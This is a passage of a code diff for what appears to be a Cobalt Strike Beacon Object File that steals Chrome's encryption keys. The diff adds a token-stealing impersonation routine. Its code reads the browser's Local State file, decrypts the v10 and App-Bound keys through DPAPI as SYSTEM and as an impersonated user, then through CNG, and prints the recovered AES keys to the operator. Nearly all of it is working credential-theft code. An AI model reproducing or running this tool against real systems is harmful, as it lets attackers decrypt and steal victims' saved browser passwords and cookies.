     status = NCRYPT$NCryptOpenKey(hProvider, &hKey, key_name, 0, 0);
     if (status != ERROR_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR,"NCryptOpenKey failed with status 0x%08X\n", status);
+        BeaconPrintf(CALLBACK_ERROR,"[!] NCryptOpenKey failed with status 0x%08X\n", status);
         NCRYPT$NCryptFreeObject(hProvider);
         return NULL;
     }
@@ -983,7 +1001,7 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     );
     
     if (status != ERROR_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR,"1st NCryptDecrypt failed with status 0x%08X\n", status);
+        BeaconPrintf(CALLBACK_ERROR,"[!] 1st NCryptDecrypt failed with status 0x%08X\n", status);
         NCRYPT$NCryptFreeObject(hKey);
         NCRYPT$NCryptFreeObject(hProvider);
         return NULL;
@@ -992,7 +1010,7 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     // Allocate output buffer
     output_buffer = (BYTE*)MSVCRT$malloc(buffer_size);
     if (!output_buffer) {
-        BeaconPrintf(CALLBACK_ERROR,"Memory allocation failed\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Memory allocation failed\n");
         NCRYPT$NCryptFreeObject(hKey);
         NCRYPT$NCryptFreeObject(hProvider);
         return NULL;
@@ -1011,7 +1029,7 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     );
     
     if (status != ERROR_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR,"2nd NCryptDecrypt failed with status 0x%08X\n", status);
+        BeaconPrintf(CALLBACK_ERROR,"[!] 2nd NCryptDecrypt failed with status 0x%08X\n", status);
         MSVCRT$free(output_buffer);
         output_buffer = NULL;
         buffer_size = 0;
@@ -1027,22 +1045,79 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     return output_buffer;
 }
 
-BOOL AppBoundDecryptor(char * localStateFile, int pid){
-    IMPORT_RESOLVE;
-
-    char * app_data = GetFileContent(localStateFile);
-    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
-    if(app_data == NULL) {
-        BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
+// Steal Token and impersonate user.
+BOOL StealAndImpersonate(int pid) {
+    HANDLE hProcess, hToken, hUser;
+    hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (hProcess == NULL) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process: %lu\n", KERNEL32$GetLastError());
         return FALSE;
     }
-    char * app_key = ExtractKey(app_data, app_pattern);
+
+    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process token: %lu\n", KERNEL32$GetLastError());
+        KERNEL32$CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to duplicate token: %lu\n", KERNEL32$GetLastError());
+        KERNEL32$CloseHandle(hToken);
+        KERNEL32$CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    if (!ADVAPI32$ImpersonateLoggedOnUser(hUser)) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to impersonate user: %lu\n", KERNEL32$GetLastError());
+        KERNEL32$CloseHandle(hToken);
+        KERNEL32$CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT,"[+] Successfully impersonated user with PID: %d\n", pid);
+    return TRUE;
+}
+
+BOOL AppBoundDecryptor(char * localStateFile, int pid){
+    //IMPORT_RESOLVE;
+
+    //BeaconPrintf(CALLBACK_OUTPUT, "Got Local State File");
+    // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
+    char * app_data = GetFileContent(localStateFile);
+    if(app_data == NULL) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Reading the file failed.\n");
+        return FALSE;
+    }
+    CHAR pattern[] = "\"encrypted_key\":\"";
+    char* v10_key = ExtractKey(app_data, pattern);
+
+    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
+    char* app_key = ExtractKey(app_data, app_pattern);
+
+    //BeaconPrintf(CALLBACK_OUTPUT,"[+] Extracted Encrypted Key %s\n", v10_key);
+    //BeaconPrintf(CALLBACK_OUTPUT,"[+] Extracted Encrypt Appboundkey %s\n", app_key);
+
+    if (v10_key != NULL) {
+        // Decrypt V10 Encryption Key
+        if (StealAndImpersonate(pid)) {
+            GetMasterKey(v10_key);
+            ADVAPI32$RevertToSelf();
+            BeaconPrintf(CALLBACK_OUTPUT,"[+] Rev2Self\n");
+        } else {
+            return FALSE;
+        }
+    }
+
+    if (app_key == NULL) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Error Encrypt Appboundkey is null\n");
+        return FALSE;
+    }
 
     // Base64 decode the app_bound_encrypted_key
     size_t encrypted_key_len;
     uint8_t* encrypted_key_with_header = Base64Decode(app_key, &encrypted_key_len);
     if (encrypted_key_with_header == NULL) {
-        BeaconPrintf(CALLBACK_ERROR,"Failed to base64 decode the key\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to base64 decode the key\n");
         KERNEL32$GlobalFree(app_data);
         KERNEL32$GlobalFree(app_key);
         return FALSE;
@@ -1050,7 +1125,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     
     // Validate key prefix (APPB)
     if (encrypted_key_len < sizeof(kCryptAppBoundKeyPrefix) || MSVCRT$memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
-        BeaconPrintf(CALLBACK_ERROR,"Invalid key header - expected 'APPB' prefix\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Invalid key header - expected 'APPB' prefix\n");
         MSVCRT$free(encrypted_key_with_header);
         KERNEL32$GlobalFree(app_data);
         KERNEL32$GlobalFree(app_key);
@@ -1060,7 +1135,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     // Strip prefix
     uint8_t* encrypted_key = (uint8_t*)MSVCRT$malloc(encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
     if (encrypted_key == NULL) {
-        BeaconPrintf(CALLBACK_ERROR,"Failed to allocate memory for encrypted key\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to allocate memory for encrypted key\n");
         MSVCRT$free(encrypted_key_with_header);
         KERNEL32$GlobalFree(app_data);
         KERNEL32$GlobalFree(app_key);
@@ -1072,7 +1147,8 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     MSVCRT$free(encrypted_key_with_header);
 
     // First, attempt to decrypt as SYSTEM
-    BeaconPrintf(CALLBACK_OUTPUT,"Attempting to decrypt key as SYSTEM...\n");
+    //BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to decrypt key as SYSTEM...\n");
+
     BYTE* decrypted_key = NULL;
     DWORD decrypted_key_len = 0;
     
@@ -1088,12 +1164,12 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     
     BOOL result = CRYPT32$CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &intermediate_blob);
     if (result) {
-        BeaconPrintf(CALLBACK_OUTPUT,"Attempting to impersonate user to decrypt...\n");
+        //BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to impersonate user to decrypt...\n");
         
         // Impersonate the user
         hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
         if (hProcess == NULL) {
-            BeaconPrintf(CALLBACK_ERROR,"Failed to open process: %lu\n", KERNEL32$GetLastError());
+            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process: %lu\n", KERNEL32$GetLastError());
             MSVCRT$free(encrypted_key);
             KERNEL32$GlobalFree(app_data);
             KERNEL32$GlobalFree(app_key);
@@ -1101,7 +1177,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
         }
         
         if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
-            BeaconPrintf(CALLBACK_ERROR,"Failed to open process token: %lu\n", KERNEL32$GetLastError());
+            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process token: %lu\n", KERNEL32$GetLastError());
             KERNEL32$CloseHandle(hProcess);
             MSVCRT$free(encrypted_key);
             KERNEL32$GlobalFree(app_data);
@@ -1110,7 +1186,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
         }
         
         if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
-            BeaconPrintf(CALLBACK_ERROR,"Failed to duplicate token: %lu\n", KERNEL32$GetLastError());
+            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to duplicate token: %lu\n", KERNEL32$GetLastError());
             KERNEL32$CloseHandle(hToken);
             KERNEL32$CloseHandle(hProcess);
             MSVCRT$free(encrypted_key);
@@ -1120,7 +1196,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
         }
         
         if (!ADVAPI32$ImpersonateLoggedOnUser(hUser)) {
-            BeaconPrintf(CALLBACK_ERROR,"Failed to impersonate user: %lu\n", KERNEL32$GetLastError());
+            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to impersonate user: %lu\n", KERNEL32$GetLastError());
             KERNEL32$CloseHandle(hToken);
             KERNEL32$CloseHandle(hProcess);
             KERNEL32$CloseHandle(hUser);
@@ -1130,12 +1206,12 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
             return FALSE;
         }
         
-        BeaconPrintf(CALLBACK_OUTPUT,"Successfully impersonated user with PID: %d\n", pid);
+        BeaconPrintf(CALLBACK_OUTPUT,"[!] Successfully impersonated user with PID: %d\n", pid);
         
         // Now try to decrypt as impersonated user
         result = CRYPT32$CryptUnprotectData(&intermediate_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob);
         if (!result) {
-            BeaconPrintf(CALLBACK_ERROR,"Decrypting as impersonated user failed: %lu\n", KERNEL32$GetLastError());
+            BeaconPrintf(CALLBACK_ERROR,"[!] Decrypting as impersonated user failed: %lu\n", KERNEL32$GetLastError());
             ADVAPI32$RevertToSelf();
             KERNEL32$CloseHandle(hToken);
             KERNEL32$CloseHandle(hProcess);
@@ -1146,9 +1222,9 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
             return FALSE;
         }
         
-        BeaconPrintf(CALLBACK_OUTPUT,"Successfully decrypted key as impersonated user!\n");
+        //BeaconPrintf(CALLBACK_OUTPUT,"[!] Successfully decrypted key as impersonated user!\n");
     } else {
-        BeaconPrintf(CALLBACK_ERROR,"Failed to decrypt key as SYSTEM!\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt key as SYSTEM!\n");
         MSVCRT$free(encrypted_key);
         KERNEL32$GlobalFree(app_data);
         KERNEL32$GlobalFree(app_key);
@@ -1161,7 +1237,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
         KERNEL32$CloseHandle(hToken);
         KERNEL32$CloseHandle(hProcess);
         KERNEL32$CloseHandle(hUser);
-        BeaconPrintf(CALLBACK_OUTPUT,"Rev2Self\n");
+        BeaconPrintf(CALLBACK_OUTPUT,"[+] Rev2Self\n");
     }
     
     // Parse the decrypted data - Chrome format
@@ -1171,7 +1247,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
 
     // Get validation string length
     if (!PopDWORDFromStringFront(&cursor, &remaining, &validation_len)) {
-        BeaconPrintf(CALLBACK_ERROR,"Failed to read validation length.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read validation length.\n");
         KERNEL32$LocalFree(decrypted_blob.pbData);
         MSVCRT$free(encrypted_key);
         KERNEL32$GlobalFree(app_data);
@@ -1180,7 +1256,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     }
     
     if (validation_len > remaining) {
-        BeaconPrintf(CALLBACK_ERROR,"Validation length (%lu) exceeds remaining data (%lu).\n", validation_len, remaining);
+        BeaconPrintf(CALLBACK_ERROR,"[!] Validation length (%lu) exceeds remaining data (%lu).\n", validation_len, remaining);
         KERNEL32$LocalFree(decrypted_blob.pbData);
         MSVCRT$free(encrypted_key);
         KERNEL32$GlobalFree(app_data);
@@ -1191,7 +1267,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     // Get validation string
     BYTE* validation_blob = cursor;
     if (!PopFromStringFront(&cursor, &remaining, validation_len, NULL)) {
-        BeaconPrintf(CALLBACK_ERROR,"Failed to extract validation blob.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to extract validation blob.\n");
         KERNEL32$LocalFree(decrypted_blob.pbData);
         MSVCRT$free(encrypted_key);
         KERNEL32$GlobalFree(app_data);
@@ -1202,7 +1278,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     // Get key length
     DWORD key_len = 0;
     if (!PopDWORDFromStringFront(&cursor, &remaining, &key_len)) {
-        BeaconPrintf(CALLBACK_ERROR,"Failed to read key length.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read key length.\n");
         KERNEL32$LocalFree(decrypted_blob.pbData);
         MSVCRT$free(encrypted_key);
         KERNEL32$GlobalFree(app_data);
@@ -1211,7 +1287,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     }
     
     if (key_len > remaining) {
-        BeaconPrintf(CALLBACK_ERROR,"Key length (%lu) exceeds remaining data (%lu).\n", key_len, remaining);
+        BeaconPrintf(CALLBACK_ERROR,"[!] Key length (%lu) exceeds remaining data (%lu).\n", key_len, remaining);
         KERNEL32$LocalFree(decrypted_blob.pbData);
         MSVCRT$free(encrypted_key);
         KERNEL32$GlobalFree(app_data);
@@ -1224,36 +1300,36 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     
         // if first byte is 03 then decyrpt with CNG
         if (key_blob[0] == 0x03) {
-            BeaconPrintf(CALLBACK_OUTPUT,"Decrypting key with CNG...");
+            //BeaconPrintf(CALLBACK_OUTPUT,"[+] Decrypting key with CNG...");
             BYTE* aes_encrypted_key = key_blob + 1;  // skip flag
             DWORD cng_out_len = 0;
             BYTE *decrypted = decrypt_with_cng(aes_encrypted_key, 32, &cng_out_len);
             if (decrypted) {
                 CHAR *chromeOutput = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);
-                BeaconPrintf(CALLBACK_OUTPUT,"CNG Decryption Output (%lu bytes):\n", cng_out_len);
+                //BeaconPrintf(CALLBACK_OUTPUT,"[+] CNG Decryption Output (%lu bytes):\n", cng_out_len);
                 
                 for (DWORD i = 0; i < cng_out_len; i++) {
                     MSVCRT$sprintf(chromeOutput, "%s\\x%02x", chromeOutput, decrypted[i]);
                 }
                 
-                BeaconPrintf(CALLBACK_OUTPUT,"Chrome AES Key: %s \n", chromeOutput );
+                BeaconPrintf(CALLBACK_OUTPUT,"[+] Chrome AES Key: %s \n", chromeOutput );
     
                 MSVCRT$free(decrypted);
                 KERNEL32$GlobalFree(chromeOutput);
     
             } else {
-                BeaconPrintf(CALLBACK_ERROR,"CNG decryption failed.\n");
+                BeaconPrintf(CALLBACK_ERROR,"[!] CNG decryption failed.\n");
             }
     
         }
-        BeaconPrintf(CALLBACK_OUTPUT,"Decrypted Key (%lu bytes):\n", key_len);
+        /* BeaconPrintf(CALLBACK_OUTPUT,"[!] Decrypted Key (%lu bytes):\n", key_len); */
         CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);
        
         for (DWORD i = 0; i < key_len; i++) {
             MSVCRT$sprintf(output, "%s\\x%02x", output, key_blob[i]);
         }
          
-        BeaconPrintf(CALLBACK_OUTPUT,"Decrypt Key: %s \n", output );
+        BeaconPrintf(CALLBACK_OUTPUT,"[+] App-Bound Key: %s \n", output );
     
     
     // Clean up
@@ -1265,7 +1341,27 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     KERNEL32$GlobalFree(output);
     
     return TRUE;
-    
+}
+
+BOOL isBrowserSupported(char* browser) {
+    for (int i = 0; i < sizeof(supported_browsers) / sizeof(supported_browsers[0]); i++) {
+        if (MSVCRT$strcmp(browser, supported_browsers[i]) == 0) {
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+BOOL ConstructDbPath(char* dest, size_t dest_size, const char* browser, const char* type) {
+    if (!dest || !browser || !type || dest_size < 1) {
+        return FALSE;
+    }
+    int result = MSVCRT$_snprintf(dest, dest_size, "%s%s.db", browser, type);
+    if (result < 0 || (size_t)result >= dest_size) {
+        dest[dest_size - 1] = '\0';
+        return FALSE;
+    }
+    return TRUE;
 }
 
 VOID go(char *buf, int len) {
@@ -1446,4 +1542,3 @@ VOID go(char *buf, int len) {
         return;
     }
 }
-
